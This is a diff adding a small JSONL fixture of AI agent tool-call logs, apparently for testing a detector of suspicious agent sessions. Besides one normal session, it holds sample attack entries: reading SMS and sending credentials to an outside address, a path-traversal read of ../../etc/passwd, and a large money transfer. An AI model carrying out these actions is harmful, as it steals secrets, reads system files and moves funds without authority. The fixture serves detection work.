@@ -1,0 +1,6 @@
+{"ts":"10:10:01","session_id":"normal","tool":"read_docs","params":{"path":"docs/faq.md"}}
+{"ts":"10:10:02","session_id":"normal","tool":"summarize","params":{}}
+{"ts":"10:07:01","session_id":"cred","tool":"read_sms","params":{}}
+{"ts":"10:07:02","session_id":"cred","tool":"send_credentials","params":{"to":"a@b.com"}}
+{"ts":"10:08:01","session_id":"path","tool":"read_docs","params":{"path":"../../etc/passwd"}}
+{"ts":"10:09:01","session_id":"transfer","tool":"transfer","params":{"amount":999999}}
